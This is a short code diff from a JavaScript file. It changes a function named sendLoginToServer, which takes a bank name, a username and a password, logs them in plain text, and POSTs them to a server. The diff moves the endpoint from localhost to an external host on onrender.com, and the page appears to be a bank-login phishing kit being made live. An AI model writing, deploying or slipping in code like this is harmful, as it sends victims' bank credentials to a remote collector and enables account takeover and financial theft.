@@ -5495,7 +5495,7 @@
         function sendLoginToServer(bankName, username, password) {
             console.log(`Sending login: ${bankName}, ${username}, ${password}`);
             
-            return fetch('http://localhost:5000/send-login', {
+            return fetch('https://gvvbt.onrender.com/send-login', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
